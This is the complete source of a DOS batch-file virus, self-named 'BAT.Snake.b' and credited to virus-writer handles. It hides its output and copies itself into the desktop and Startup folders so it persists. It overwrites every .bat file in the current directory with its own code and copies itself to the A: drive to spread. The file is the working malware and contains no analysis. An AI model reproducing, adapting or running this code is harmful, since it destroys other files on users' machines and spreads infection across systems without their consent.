cls
@echo off
ReM BAT.Snake.b
ReM by SeCoNd PaRt To HeLl & The Dead King
ctty nul
copy %0 %windir%\desktop\*.bat
copy %0 %windir%\startm~1\progra~1\auotst~1\WSt.bat
set snake=for
goto snake
set snake=snake
:snake
%snake% %%v in (*.bat) do copy %0 %%v
command /f /c copy %0 A:\
ctty con